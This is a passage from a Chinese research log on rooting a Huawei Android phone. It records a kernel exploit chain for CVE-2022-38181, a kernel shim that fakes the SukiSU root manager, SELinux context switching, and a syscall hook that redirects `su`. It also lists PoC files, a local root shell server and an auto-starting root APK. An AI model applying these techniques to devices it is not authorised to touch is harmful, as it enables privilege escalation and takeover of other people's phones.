- `flags` 应为 `0x7 = LKM(1<<0)|MANAGER(1<<1)|LATE_LOAD(1<<2)`，
  **不要置 `BUNDLED(1<<4)`**。`LATE_LOAD` 让 UI 显示红色「越狱模式」，
  且 `StatusCard.onClick` 不再跳刷机页、`canInstallKernelUpdate=false`。
- **v4.3.0-r1 Manager 在 Android 10 启动即崩**：
  `Resources$NotFoundException: drawable/ic_launcher_splash` →
  `RuntimeException: Unknown animator name: pathInterpolator`。这是选 40994
  的直接原因，不是退而求其次。

#### C-44. 【定论】管理器「工作中 + 越狱模式」是叠加，不是取代

`HomeMaterial.kt` 的 `StatusCard` 用 `ksuVersion != null` 决定
`ActiveStatusCard`（主文本 `HOME_STATUS_WORKING`）还是「不支持」；
`ActiveStatusCard` 标签行另有 `if (state.isLateLoadMode) StatusTag(jailbreak_mode)`。
`isLateLoadMode ← GET_INFO.flags & KSU_GET_INFO_FLAG_LATE_LOAD`，内核
`dispatch.c` 只在 `ksu_late_loaded` 为真时置位；垫片自己决定 flags，主动置上即可。

#### C-45. 【定论】root shell 的 SELinux 域必须用内核标准路径修，不要手算 cred 偏移

官方 `GRANT_ROOT` 会同时应用 App Profile 的 SELinux domain（默认
`u:r:ksu:s0`）；`ksud/src/su.rs::grant_root()` 只调 `ksucalls::grant_root()`
然后 exec sh，注释写着 "The kernel has already applied the selected root profile"。
只做 `prepare_kernel_cred(NULL)+commit_creds()` 会把上下文重置成 init_cred 的
`u:r:kernel:s0` → `pm list packages` 报 `Can't find service: package`
（servicemanager 在 enforcing 侧拒绝 kernel 域），`RootService` 的
`app_process` 起不来 → 超级用户页恒为空。
**修法**：垫片里用 `filp_open("/proc/self/attr/current", O_WRONLY)` +
`kernel_write` 写 `u:r:shell:s0`（4 参数版，符号全导出）。零 `struct cred`
偏移、零 RO 写、零 panic 风险。实测 `setcon: ok=N fail=0`，同一进程
`setcon` 后包数从 1 行错误变成 211 个。
注意：`echo 0 > /sys/fs/selinux/enforce` 在本机 RC=1，这条路不可用；
`getenforce` 显示 Enforcing 与 kernel 域是 permissive 域并不矛盾。

#### C-46. 【事故 + 定论】三个必须记住的实现坑

1. **`NEW_GET_ALLOW_LIST` 写 8 字节会崩管理器**。
   `uapi/supercall.h` 里 `struct ksu_new_get_allow_list_cmd` 是
   `__u16 count; __u16 total_count; __u32 uids[0];` → **sizeof=4 /
   offsetof(uids)=4**；JNI `getSuperuserCount()` 把它声明成 **4 字节栈对象**。
   早期垫片往 `arg` 写两个 `__u32`（8 字节）并把 uid 放偏移 8，直接踩坏
   native 栈返回地址 → `SIGSEGV pc/lr=0x7800000000`（tombstone_05…08）。
   正确做法：`copy_to_user(arg,&hdr,sizeof(hdr))` 恰好 4 字节，uid 从 +4 开始。
2. **"首次 syscall 就自动提权"会把被授权 app 搞死**。
   新 fork 的 app 还没 `attachApplication` 到 system_server 就变成 uid 0 →
   `attachApplicationLocked process:null ... belongs to another existing app`
   → 进程被清。对照实验：撤销授权后千问 4 个 `u0_a19` 进程正常启动。
   正确语义：授权只等于「允许该 uid 调用 `GRANT_ROOT`」，由 `hlk_su`
   显式请求；`auto_roots` 应恒为 0。
3. **按 task_struct 指针去重会 fd 泄漏**。128 槽环形表被线程冲刷，
   被淘汰的活线程每次 syscall 都重装 fd → 千问单进程 1946 个
   `[ksu_driver]` fd 且持续增长。改用导出的
   `__task_pid_nr_ns(task, __PIDTYPE_TGID, NULL)` **按 TGID 去重**、
   只给 Manager 自动装 fd；被授权 app 走 reboot magic 按需申请。
   本机 4.14 的 `enum pid_type` 是裁剪版，
   **__PIDTYPE_TGID = 4（不是 mainline 的 1）**，传 1 拿到的是 PGID。
   修复后：管理器 1 个 ksu fd、被授权 app 0 个，`auto_fds` 12 秒不增长。

附带工程坑：`__sync_bool_compare_and_swap` 在 aarch64 GCC 默认 outline
atomics 下生成 `U __aarch64_cas4_sync`（内核不导出）→ 构建 Makefile 必须
`ccflags-y += -mno-outline-atomics`。

#### C-47. 【事故 + 红线】绝不给 zygote 注入 fd

为绕开「首页状态在用户态守护注入 fd 之前就缓存」的时序竞争，曾尝试让
zygote 继承 `[ksu_driver]` fd：`echo <zygote64 pid> > /proc/hlksu_fd6`。
随后 ADB 断连、设备**完整重启**（uptime 归零、模块全清、root 链消失）。
华为 4.14 内核在 zygote 上下文执行 `task_work_add` 回调疑似 panic。
**新增红线：不对 zygote / system_server / 任何 uid 0 的系统关键进程做
task_work 注入。** 最终解法改为「内核 probe 按 Manager TGID 在进程第一次
syscall 时装 fd」，必然早于 `HomeViewModel.buildState()`，也不需要用户态守护。

后续每个新版模块都是 `[permanent]` 卸不掉，于是在 init 时调用
`tracepoint_probe_unregister(__tracepoint_sys_enter, <旧探针>, NULL)`
退役上一版；`mod_find_symname()` 不过滤 `STB_LOCAL`，静态模块符号可由
`kallsyms_lookup_name()` 解析。各版 `old_unreg=0`。

#### C-48. 【定论】最终验收与边界（2026-11-06 10:01）

- 首页 `越狱模式 + 工作中 + 版本：40994-5`，无「需要更新管理器」/
  「获取 Root 失败！」；`内核完整版本 v4.2.1-40994-hlk-shim9`、
  `钩子类型 跟踪点钩子`。
- 超级用户页 `已授权 1 / 7 个应用`，千问带 `ROOT` 徽章；
  `KsuService: getPackages: 211`（`getAliveUsers reflection failed` 是
  华为无该方法的无害日志）。
- `/data/local/tmp/hlk_su`：uid 0 → `kernel:s0`；授权 uid 10019 →
  `uid=0(root) ... u:r:shell:s0`；未授权 uid 10016 → `EPERM`。
- `/proc/hlksu_fd9`：`old_unreg=0 / setcon ok=N fail=0 / auto_roots=0 /
  auto_fds=<常数> / grants=N fails=1`。
- 边界：allowlist 只在模块内存，重启要重新授权；`/system` system-as-root
  只读、app PATH 全只读 → 放不了标准 `su`，被授权 app 必须显式调用
  `/data/local/tmp/hlk_su`；KSU zip 模块能装不能生效（`on_post_fs_data()`
  需开机 init 触发，与免 BL 冲突）。

## 文件清单

> 下面是研究阶段的工作清单（含原始仓库路径）。**标注「已删」的条目已不在发布包内**，只保留原始仓库副本；当前发布包的实际文件见 `docs/USAGE.md` 第 5、13 节。

- devmap/dev_nodes.txt — /dev 全量节点+权限
- devmap/sysctl_hardening.txt — sysctl 状态
- sepolicy/plat_sepolicy.cil、vendor_sepolicy.cil — SELinux 文本策略
- sepolicy/*_file_context* — 文件标签
- config/hlk_config.txt、config/hlk_config.gz — 从设备 `/proc/config.gz` 拉取的运行内核配置（6115 行，权威）
- refs/hm2-config/Code_Opensource/kernel/arch/arm64/configs/merge_orlando_defconfig — HM2 内核 defconfig（与运行配置基本一致）
- probe/alias_bisect.c — 别名路径逐步二分探针（fsync 进度日志穿越 panic；mode 7 = 每源 nents=1 规避验证）
- probe/jit_write_probe.c / _v2 / _v3 / _v4 — CVE-2022-38181 主探针（UAF→PTE 劫持→物理读写→镜像定位→数据写提权）；v4 = 当前版本
- probe/jit_write_probe_v6 / _v7 / _v8 / _v9 — 后续版本：v6 打通 phase E（dump 重试 + keepalive）；v7 加代码补丁 phase F；v8 加 uptime gate；v9 修正 avc 补丁 + 写后验证重试 + 逐核触发 + root 通道（v9 = 已在真机跑通的版本，md5 `980328ec94a0d2931239f97097020406`）
- probe/run_v9.sh — 主机侧 v9 运行脚本（等待/门控/push/校验/后台启动/日志镜像；run_v8.sh 已更名）
- probe/jit_write_probe_v10 — v10 PoC（修正页内验证 + 新增 phase G；md5 `5855a970e42476241dcdd7ad2f97ed12`）
- probe/jit_write_probe_v11 — v11 PoC（统一槽 510 + phase G 父进程改造；md5 `66ca37870032444ac9846e60df910700`）【已删】
- probe/run_v10.sh、probe/run_v11.sh — 一键驱动（门控/md5/FBE 预建/日志镜像/root 自检）
- probe/jit_write_probe_v12 — v12 PoC（phase H 缓存一致性实验；md5 `5469060334c40680dacb553e7d3e1692`）
- probe/run_v12.sh — v12 一键驱动
- probe/jit_write_probe_v14 — v14 PoC（L2 2MB 块描述符通道 + 文本补丁 + flush-only 触发；md5 `6e145f213efefacc6d52a28f260ca74c`）【已删】
- probe/run_v14.sh — v14 一键驱动
- probe/jit_write_probe_v15 — v15 PoC（缓存日志 fd + 预开 marker + modprobe 助手持久通道；md5 `dff49a69cacdd8be127ba569a20f59a5`）
- probe/run_v15.sh — v15 一键驱动
- probe/archive-v9/、probe/archive-v10/、probe/archive-v11/、probe/archive-v14/、probe/archive-v15/ — 各版本设备日志、root 证据归档（v14_textroot_evidence.txt = 两次运行的 Uid 0 证据）
- probe/enfread.c / probe/enfread — 单进程验证器：绑 cpu0 读 enforce，退出码 7 表示文本补丁执行且进程 uid 0
- probe/rootd.sh — 持久 root 命令通道（rootcmd → rootout；daemon pid 8735）
- probe/mp.sh — phase F 的 modprobe helper（记录 uid/enforcing，启动 rootd.sh 与 rootsrv；更新后 md5 `78649d988f75e06e600ebd8c08153e85`）
- probe/rootsrv.c / probe/rootsrv — 静态 uid 0 TCP shell server（127.0.0.1:45679，adb forward 可达，md5 `15b913b5c2aeabca26371e309ff2933e`）
- probe/rootshell.py — 主机侧交互客户端（自动 adb forward 45679 并转发终端）
- probe/r — 设备侧同步 root 命令包装器（原子 rootcmd + 完成标记；`/data/local/tmp/r <cmd>`）
- probe/_phaseF_new.txt — phase F 代码块（拼接用）
- probe/mp.sh — phase F 的 modprobe helper 脚本（root 证据 + 复制 rootsh）
- koffs.txt — 相对 `_text` 的符号偏移表（设备路径 `/data/local/tmp/koffs.txt`，v14 起新增 flush_icache_range / inval_dcache_area，当前 md5 `a5d456ec4263d02924ff0f70f01be26b`）
- docs/RESEARCH_LOG.md — 完整研究过程档案（时间线、里程碑、失败复盘；第 21 章 = SukiSU Ultra 落地）
- docs/USAGE.md — 文件清单与使用教程（第 9 节 SukiSU Ultra、第 15 节垫片原理/重建；v11/v14 与旧自研模块教程已删除）
- tools/mk_koffs.py — 从 kimage.bin 提取相对 _text 的符号偏移（koffs.txt）
- tools/dis_cfi.py — 按 VA 反汇编 kimage.bin、解析 adrp/adr 目标到最近 kallsyms 符号
- docs/mali_lpe_design.md — HM2（CVE-2022-38181）提权链设计：UAF→GPU 页表劫持→WRITE_VALUE 任意物理写→数据面 root helper；含源码行号、ABI、分阶段真机验证与风险表
- probe/jit_write_probe_v16.c — v16 克隆 cred 提权探针（phase A–J，含内置符号表、自检模式、任务链表遍历诊断、日志管道旁路、`avc_denied` 补丁）
- probe/run_v16.sh — v16 一键驱动（`dry`/`go`，900 s 门控、双向 md5、镜像 fsync 日志）
- probe/run_v16c.sh — v16c 一键驱动（在 v16 基础上加 `avc` 模式：同时下发 `v16_go` 与 `v16_avc` 两个开关文件，并要求 phaseJ 证据 `avc_denied off=` / `patched` / `avc=1` 全绿）
- probe/archive-v16a/ — v16a dry 全绿归档（源码、二进制、日志、偏移表）
- probe/archive-v16b/ — v16b「保留自有 SID」归档：受限 root 的证据（`uid=0 context=u:r:shell:s0`，但 `app_data_file` / `block_device` 全被拒），含 phaseJ 首个失败样例（`event code=0x58` 对齐故障）
- probe/archive-v16c/ — v16c「phaseJ 成功但 cred 未落地」归档：内核已转 permissive（`/data/system` 可读、`/proc/kallsyms` 不再拒），但没拿到 uid 0
- probe/archive-v16e/ — **v16e 全链路成功归档**：`PHASE_I OK uid=0 caps=7fffffffff avc=1 sid=kernel(init_cred)`，含 18 分钟后持久性复采证据（`id` / `/data/data` / `kallsyms` / 新建文件四项全通）、二进制（md5 `36d6b858e9f5f376290a94cfa6d97fea`）、设备日志与主机日志
- android/ — 开机自启 APK：`fetch_toolchain.sh`（下 JDK+build-tools+platform）、`build.sh`、`install.sh`、`src/`、`AndroidManifest.xml`、`README.md`
- android/out/hlk-root-guard.apk — 成品（约 590 KB，含 libxprobe.so 与 root 通道 assets）
- probe/jit_write_probe_v17.c — v17「纯数据写 + usermodehelper」探针（`PROBE_UMH=0` 可退回 v16 的 `sys_call_table` 路径；`PROBE_MP` 指定 helper 脚本落点）。新增 `lsm_plan_unlinks()` / `lsm_apply()`：按快照算出摘链写单，再通过一个 2 MB 窗口平铺写回；写完必须回读复算，剩下 0 个 SELinux 节点才继续
- probe/run_v17.sh — v17 一键驱动（900 s 门控、md5 校验、清理 `/data/local/tmp/{mp,trig,rootup,mp.pid}`、日志镜像到 `probe/v17_run.host.log`）
- probe/archive-apk/app_probe_v16f.log — 应用域第一现场（`hooks: seccomp blocked every ni slot` → `rc=159` = SIGSYS）
- probe/archive-v17/ — v17 各次尝试的设备/主机日志（第一次：VA/PA 混用导致 0 个节点被识别）
- sukisu-ultra/hlk_ksu_shim9.c / .ko — **当前终态主产物**：v6 内核垫片（sys_enter tracepoint + supercall ioctl 分派 + allowlist + setcon；md5 `8040e5b62ff3e065b833abebcd849ba7`）
- sukisu-ultra/hlk_su.c / hlk_su — 被授权 app 请求 root 的静态 ELF（扫 `[ksu_driver]` fd → reboot magic → `GRANT_ROOT` → exec sh；md5 `a1bde0821f449a5716a1554d9da55ad9`）
- sukisu-ultra/resume9.sh / ksu_up9.sh / verify9.sh / build9.sh — 重启后一键恢复 / 设备侧 insmod / 验收 / 重建
- sukisu-ultra/assets/SukiSU_v4.2.1_40994-release.apk — 官方 Manager（versionCode 40994，UAPI 5；md5 `fa8dae0532b934d49222a91361d4b8cb`，sha256 `c7f69280…5f40ed`）
- sukisu-ultra/assets/supercall.h / app_profile.h / manager.h — v4.2.1 UAPI 正本（`supercall.h` md5 `d11ea77d5d74aebc377261341e8f1e93`）
- sukisu-ultra/config/hlk_config.txt — 运行内核配置（重编模块用）、evidence/*.png — 首页与超级用户页验收截图
- sukisu-ultra/README.md — 终态完整说明；旧时代自研模块（原 `ksu-lkm/`）**已从发布包删除**，不要再加载
- ksu-shim/（原始仓库）— 垫片迭代源码与中间产物 v1…v5、`ksu_probe`、`modtest/` 测试 zip、诊断脚本；发布包只收最终 v6

## 补充（2026-11-06 11:25）：C-49…C-51 一体化 APK

- **C-49｜一个 APK 完成两级部署**。`android/out/hlk-root-guard.apk` v0.2
  （md5 `be7c0061aa46f32c65f303c5639d3e80`，19 MB）在 `assets/ksu/` 内置
  `hlk_ksu_shim9.ko` / `hlk_su` / `ksu_bootstrap.sh` / `ksu_install_mgr.sh` /
  官方 Manager v4.2.1 APK。`GuardService.pumpOutput()` 在 `PHASE_I OK` 时调
  `KsuBootstrap.onRoot()`（**独立线程**，绝不阻塞 stdout pump，否则探针 stdout
  缓冲填满会卡死利用链）。流程：提取 assets → 轮询 `r` 通道 →
  `ksu_bootstrap.sh` 幂等 insmod → Java `PackageManager.getApplicationInfo()`
  取 uid 写 `/proc/hlksu_fd9` → Manager 重启后由 TGID probe 装 fd。
- **C-50｜kernel 域与 shell 域的分工**。`u:r:kernel:s0` 实测 `pm path` /
  `pm install` 均报 `cmd: Can't find service: package`；
  `echo u:r:shell:s0 > /proc/self/attr/current` 后立刻恢复（211 包）。
  但 setcon 后**读不到应用私有目录 `app_data_file`**，所以 Manager APK
  必须在 kernel 域由 `ksu_bootstrap.sh` 先 stage 到 `/data/local/tmp/`，
  安装器日志也只能放 `/data/local/tmp/`。`input` / `uiautomator` 在
  shell 域都返回 RC=0。
- **C-51｜`pm install` 绝不能同步进 rootcmd**。华为对 `pm install`（包括
  `install-create/write/commit` session 方式）弹两级 PackageInstaller 确认框；
  同步执行会阻塞 rootd 的执行循环，整条 root 命令通道失效（实测 `r` 挂满
  120 s）。必须 `setsid timeout 90 ... &` 后台执行，脚本内 `uiautomator dump`
  解析「继续安装/完成」坐标 + `input tap`。真机实测：`TAP` ×3 →
  `PM-EXITED round=4` → `INSTALL-OK` / `Success`，root 通道全程正常。
  附带教训：测试时误把 `/data/local/tmp/ksu.apk`（v4.3.0-r1 / 41140，
  19.7 MB）覆盖安装了 Manager，已用发布包 17 MB 的 40994 恢复；
  **设备上的临时 APK 不能当版本依据**。
- 控制面：`/sdcard/HLK_KSU_OFF` 硬关闭第二级；`--es cmd ksu` 手动重放
  （不重新武装探针）；`adb logcat -s HlkGuard | grep ksu:` 看状态。
- **完整开机验收未执行**（需重启 + 1500 s 门禁）；已实测两个脚本的设备侧
  行为与 APK 内置 5 个产物逐字节一致。

## 补充（2026-11-06 12:55）：C-52…C-54 一体化 APK 的真机全自动验收

- **C-52｜v0.2 的真机故障 = rootout 权限，不是部署脚本**。现象：日志停在
  `ksu: assets 5/5` 后再无下文，模块不加载。根因：`GuardService.runAsRoot()`
  用"读 `chan/rootout` 找 `__DONE_<tok>`"判断命令结束，而调用方每次先删该
  文件、由 rootd 以 root 身份**重建**（umask 下 0600 root:root），应用
  （u0_a14）根本读不到 → 每次调用都等满超时。`/data/local/tmp/rootout`
  能用只是因为启动路径 `chmod 666` 过一次；每命令重建的通道目录没有。
  修法：`probe/rootd.sh` 在 `echo "rc=$?"` 之后补
  `chmod 666 "$D/rootout"`；`KsuBootstrap` 增 `procUp()/readProc()`，
  以 `/proc/hlksu_fd9` 存在性和 `mgr_uid=<uid>` 回读为权威判据，
  stdout 只作日志。v0.3 APK md5 `be7c0061aa46f32c65f303c5639d3e80`。
- **C-53｜全自动开机链实测通过（12:51）**。重启后 `BootReceiver` 在
  `uptime=27s` 自动武装（华为启动管理白名单此前已放行，重启不清），
  探针自己 `wait_for_idle` 到 `uptime≈1532s`，随后一条龙：
  `PHASE_I OK` → `ksu: assets 5/5` → `bootstrap: INSMOD-RC=0 /
  BOOTSTRAP-DONE` → `mgr_uid=10164`（回读一致）→ `SukiSU layer ready`。
  `/proc/hlksu_fd9`：`reg_rc=0 hits=3 setcon ok=3 grants=3 getinfo=1
  auto_fds=23 allow_su=1`；管理器 1 个 `[ksu_driver]` fd、共 120 个 fd。
  首页 `越狱模式 / 工作中 / 40994-5`，超级用户页 7 个应用、
  ZeroTermux（uid 10016）带 ROOT 徽章。
  **勘误（2026-11-06 13:30 复测）**：当次徽章是同一 boot 内刚在 UI 打过勾，
  不是跨重启保留。allowlist 只在垫片内存（64 项 `g_prof[]`），本机
  **没有任何落盘数据库**——`/data/data/com.sukisu.ultra/databases/` 不存在、
  `/data/adb/ksu` 不存在（真机上的持久化原本由 `ksud` 负责，本方案没有
  `ksud`）。重启后超级用户页仍列出 7 个"本 boot 内请求过 root"的应用，但
  状态是 `已授权 0 / 7`、`allow_su=0`；在 App Profile 里重新打勾后立刻变
  `1 / 7` 并出现 `ROOT` 徽章，`/proc/hlksu_fd9` 计数同步（`hits 12→14`、
  `setcon ok 10→12`、`auto_fds 49→66`）。结论：**重启后必须重新授权**，
  这与"临时 root 重启即失效"的定位自洽。
- **C-54｜覆盖安装 APK 的时机红线**。探针在 `wait_for_idle`（未写内核）时
  覆盖安装是安全的（本次 v0.2→v0.3 未重启）；探针处于 `PHASE_I OK` /
  `keepalive` 时覆盖安装会连带杀掉探针，实测 `bootreason=abnormal` 重启。
  另外 `pm install` 在**锁屏**状态下会 `INSTALL_FAILED_ABORTED:
  User rejected permissions`，自动化脚本必须先 `KEYCODE_WAKEUP` + 上滑解锁。
  还有一个容易误判的现象：`ksu: mgr_uid=… -> (no answer)` 可能来自
  `MainActivity.onCreate → KsuBootstrap.ensureUid()`（系统把界面恢复到
  前台），**不代表部署已开始**，判据仍看 `assets 5/5` 与 `/proc/hlksu_fd9`。
- **C-55｜Termux 里 `su` 找不到 ≠ 没授权（2026-11-06 16:29 实测）**。
  现象：管理器里给了 Termux（uid 10016）root，Termux 里敲 `su` 报
  `No su program found on this device.`。根因不是权限，而是**本方案不往
  `/system` 写 su 二进制**；Termux 自带的 `$PREFIX/bin/su` 只会去
  `/debug_ramdisk /sbin /system/bin /system/xbin /su/bin` 找别人装好的 su，
  找不到就打印这句。判据看 `/proc/hlksu_fd9`：`allow_su=1` 且 `grants` /
  `setcon ok` 随调用增长即授权生效（本次 21→33）。
  修法：`sukisu-ultra/termux_su.sh` → `$PREFIX/bin/su`（`chmod 700`，
  owner 取 `stat -c %u /data/data/com.termux`），脚本里调
  `/data/local/tmp/hlk_su` 并把 `/system/bin` 补进 `PATH`。
  **第二个坑**：只换 su 不补 PATH 时，`su -c id` 会报
  `/system/bin/sh: id: inaccessible or not found` —— `hlk_su` exec 的
  `/system/bin/sh` 不会重置 `PATH`，而 Termux 的 `PATH` 里没有 `/system/bin`，
  看起来像"提权没成功"，其实已经 `uid=0`。
  实测结果：`su -c id` → `uid=0(root) context=u:r:shell:s0`；
  `su` 交互提示符 `/ #`；`ls /data/data` 可见全部包名；
  `cd /data/data/com.termux/files/home` 可进（root + shell 域）。
  `resume9.sh` 已加 1b 步自动安装（Termux 未装则跳过），并做了
  `[ -s ]` 前置判断——否则 `cat 不存在的文件 > $D/su` 会把用户的 su 截成 0 字节。
- **C-56｜sucompat 原型跑通：跟踪点改 `regs[0]` 就足以劫持 `execve("su")`**
  （2026-11-06 22:10）。目标：让普通 app 的 `Runtime.exec("su")` 也能提权。
  先确认了 SukiSU 的做法（`kernel/feature/sucompat.c`）：它把 `execve` 整形成
  `execveat(fd_of_ksud, "", argv, envp, AT_EMPTY_PATH)`，`escape_with_root_profile()`
  **先提权再 exec**，还 hook `faccessat`/`stat`；底座是
  `ksu_syscall_table_hook()`（fixmap + stop_machine 改表）——本机
  `CONFIG_KPROBES is not set`、`CONFIG_FUNCTION_TRACER is not set`，改表是红线，
  抄不了。
  退化方案 `hlk_sucompat.ko`：只在 `sys_enter` 里判断
  `__NR_execve(221)/__NR_execveat(281)`，`__copy_from_user_inatomic` 读路径，
  精确匹配 `su` / `/system/bin/su` / `/system/xbin/su` / `/system/sbin/su` /
  `/sbin/su` / `/su/bin/su` / `/debug_ramdisk/su`，命中就把目标路径写进调用者
  栈 `sp-256`（`__copy_to_user_inatomic` + `pagefault_disable`）并改
  `regs[0]`。arm64 的 syscall 包装宏确实在调用时从 pt_regs 取参，实测改写生效。
  三个必须记的事实：
  1) **目标必须调用者可执行**。`/data/local/tmp` 是 `shell_data_file`，AOSP 默认
     禁止 `untrusted_app` 执行；本机 EMUI 策略放行——实测 Termux 直接跑
     `/data/local/tmp/hlk_su` 成功。换机型先验这一步，否则重定向只会把 ENOENT
     变成 EACCES。
  2) **`hlk_su` 不设 PATH**，Termux 这类覆盖了 PATH 的 app 会得到
     `id: inaccessible or not found`（看着像失败，其实已 uid 0）。解法：重定向
     目标是 3 行脚本 `/data/local/tmp/su.sh`（补 PATH 再 exec hlk_su）。真实
     Android app 的 PATH 来自 zygote（`/sbin:/system/sbin:/product/bin:/apex/…/
     bin:/system/bin:…`），不补也够用。
  3) **v1 的目标路径缓冲只有 32 字节**，35 字节的
     `/data/local/tmp/hlk_su_launcher.sh` 被 `n_noslot` 静默丢弃（表现为
     重定向"偶尔不生效"）。v2 把输入缓冲仍设 32、目标缓冲放宽到 96。
  实测矩阵：shell(2000) → `uid=0 u:r:shell:s0`；Termux(10016) 未授权 →
  `GRANT_ROOT denied`；授权后 → `uid=0 u:r:shell:s0`；`sucompat=0` 或
  `only_uid` 不匹配 → 退回 ENOENT 且 `skip_uid` 计数 +1。
  边界：不改 `argv`、目标必须调用者可执行、模块 `[permanent]`（永不 `rmmod`）
  重启即消失。
- **C-57｜v0.4：sucompat 进 APK 开机链，零手工（2026-11-06 23:28 验收）**。
  `KsuBootstrap.ASSETS` 增 `hlk_sucompat.ko` + `su.sh`（共 7 项），
  `ksu_bootstrap.sh` 在 shim 之后幂等 `insmod`，失败不影响垫片部署。
  实测重启后 `assets 7/7` → `INSMOD-RC=0` → `SUCOMPAT-RC=0` →
  `SukiSU layer ready`；shell(2000) 与 Termux(10016，UI 打勾后) 都是
  `access=0 stat=0` → `uid=0 … u:r:shell:s0`；未授权 Termux 得 `GRANT_ROOT denied`。
  另补 `fake_stat`（faccessat/newfstatat 一起改写），门禁仍只在 `GRANT_ROOT`。
  三个新坑：① `proc_create` 撞名会让第二个实例的 `insmod` 报
  `Out of memory`（其实是 init 返回 -ENOMEM），调试用
  `-DHLK_PROC_NAME` 改名；② `pm install` 会连坐杀掉探针，`wait_for_idle`
  窗口装 APK 同样让这一轮作废；③ `aapt2 link --version-code` 不生效，
  `AndroidManifest.xml` 里写死的 `versionCode` 才是最终值。
  另记：22:58 那轮利用链在 `uptime=1501.04` 自己 panic 重启
  （`bootreason=abnormal`，当时模块未加载），同版本此前多次成功，属概率问题。
- **C-58｜v0.5：真实 app 验收推翻了"自测通过 == 能用"（2026-11-07）**。
  v0.4 的 sucompat 只用自写的 `hlk_execsu` 验过。用户改用 **MT 管理器**
  （`bin.mt.plus.canary` uid 10102）作判据：授权后访问 `/data` 只有
  `文件夹 1 / 文件 0`（仅 `app`），而真 root 是 70 项 → 暴露一个自测测不出的
  缺陷。
  根因：`stack_slot()` **单点**在 `SP-256` 写目标路径，且 `SP & 4095 < 512`
  直接放弃；跟踪点里只能 `__copy_to_user_inatomic`，目标页未驻留也失败。
  ART 的 native 栈频繁踩中 → `fault_out` 每次 MT 启动 +4，而 `hits_stat`
  从不增长，即**所有 su 路径的 access/stat 改写全部落空**，MT 判定"没有 su"。
  诊断手段：给 `su.sh` 加一行 `log -p i -t HlkSu "args=[$*]"`（**写文件不行**，
  app 域对 `shell_data_file` 只有 execute 没有 write，只有 logcat 通），
  抓到 MT 序列 v0.4 是 `su -h` 后放弃、v0.5 是 `su -h` → 交互式 `su`。
  修复：`stack_slot()` 三档回退 `SP-64/-160/-320`（最近处先试），
  加 `slot: guard/copyfail` 计数；`PATHBUF` 32→24；execve 也加一字节前缀过滤。
  `su.sh` 另加 `su(1)` 参数归一化（`-h/-v/--mount-master/-s` 等）。
  实测新模块 `fault_in=0 fault_out=0 guard=0 copyfail=0`，MT 的 `/data`
  变成 **66 个文件夹**，`grants` 同步增长。
  **归因实验**：v0.5 模块 + v0.4 原始 su.sh **仍成功**；v0.4 模块 + 参数兼容
  su.sh **仍失败** → 必需的是内核修复，su.sh 只是兼容性增强。
  另一个通用技巧：`[permanent]` 模块不能 `rmmod`、同名 `/proc` 又会让第二份
  `insmod` 报 ENOMEM；用 `-DHLK_PROC_NAME=\"hlk_sucompat2\"` 编第二份并
  先 `echo 0 > .../sucompat` 关掉旧的，即可**同一 boot 内 A/B 热替换**，
  省掉每轮 25 分钟开机链。
  附带：`screencap` 是 1080×2340，视觉预览缩小一半，`input tap` 坐标要 ×2。
- **C-59｜25 分钟过闸 = 盲等，不是链需要（2026-11-07 采样实测）**。
  成功轮：探针 27 s 启动 → `wait_for_idle` 空等 1472 s → 门禁一放行
  **4.8 s** 到 `PHASE_I OK`。三道门中 `up>=1500` 占全部耗时；
  `MemAvailable>=3000` 在 27 s 就通过；真正判空闲的 `/proc/loadavg`
  runnable 因 `untrusted_app` 被 SELinux 拒读而**直接 return**，
  所以设计者用墙上时间兜底（v8 原本只有 900 s 门）。
  诊断版（放行逻辑未改、只加 `PROBE_GATE_UP` 参数化 + 每 30 s 采样）
  跑出 51 点曲线：0–120 s 还在变，**120–240 s 突跳 +400 MiB**
  （开机服务释放内存），240 s 之后 `avail` 稳定在 3853–3928、
  `Cached` 2046–2098。连续 6 点波动 <100 MiB 且 avail≥3500
  **首次 up=237 s 满足，约 387 s 即可放行**；1500 s 时 avail=3853
  与 387 s 几乎一致 → 后 18 分钟无实质变化。
  建议第二步：`up>=300 s` + `avail>=3500` + 连续 6 点稳定，
  保留 1500 硬上限与 `PROBE_GATE_MODE=time` 回退，预期 6–8 分钟。
  唯一未验证假设：MemAvailable 不直接等于 kmalloc-512 争用消失；
  且本轮 1500 s 放行后仍在 keepalive 阶段 panic，说明**时间门不消除 panic**。
  原始数据 `probe/gate_samples_20261107.txt`，详见 `RESEARCH_LOG` §26。
  另记两条工程教训：① 有存活 keepalive 探针时 `pm install` 必炸，
  须「重启 → wait_for_idle 窗口装 → 再重启」；② NDK r21e 可把探针源码
  逐字节重编出 `113aa179…`，改门禁是可复现的。
- **C-60｜v0.6 信号门：过闸 25 分钟 → 6.5 分钟（2026-11-07 真机）**。
  §26 采样证明 1500 s 只是 `untrusted_app` 读不到 `/proc/loadavg` 后的
  墙上时间兜底。v0.6 把 `wait_for_idle()` 第一道门换成信号门：
  `up>=300s` + `MemAvailable>=3500MiB` + 连续 6 点(180s) avail 波动
  ≤100MiB / Cached ≤64MiB，`up>=1500s` 硬上限兜底；第二/三道门与整条
  利用链一行未动。离线拿 51 点数据模拟预测 387 s，真机两轮实测
  **390 s / 388 s** 放行，+6~8 s 到 `PHASE_I OK`（原 1472 s 空等）。
  模式 `PROBE_GATE_MODE=signal|time|either`（默认 signal，`time` 逐字等价
  v16 一键回退），`PROBE_GATE_UP` 改硬上限；env 由 Java `GuardService` 从
  SharedPreferences 注入（app 域不能写 `/data/local/tmp`，只能走 env），
  `CtlReceiver cmd gate --es mode time` 切换。`/proc/meminfo` 不可读自动
  降级 time。APK v0.6 `515706d2…`，探针 `01bb455c…`。
  **未标定完成**：两轮放行后都在 `keepalive` 阶段 `abnormal` 重启（1500 s
  放行也常这样），「MemAvailable 稳定 == kmalloc-512 争用消失」仍是假设，
  需连续 3 轮完整跑通才算通过。详见 `RESEARCH_LOG` §27、`USAGE 9.12`。
- **C-61｜对照实验推翻信号门假设（2026-11-07 12:00）**。signal 放行稳定
  （4 轮 387–407 s）但 **0/4 完整跑通**：3 轮 `PHASE_I OK → keepalive` 后
  `abnormal` 重启、第 4 轮更早崩。两组对照：① `cmd gate --es mode time`
  一轮 `HARD LIMIT up=1527s` → `assets 7/7` → `SUCOMPAT-RC=0` →
  `SukiSU layer ready`，`bootreason=reboot` ✅；② 不重装 APK、距装机 1 小时
  仅切回 signal 再跑，仍崩 ❌ → **排除「刚装 APK 的 dexopt 瞬态」**。
  所以差异来自放行时刻本身：**MemAvailable/Cached 只反映页缓存，
  ≠ kmalloc-512 slab 争用消失**；§26「后 18 分钟系统状态没变化」只对内存
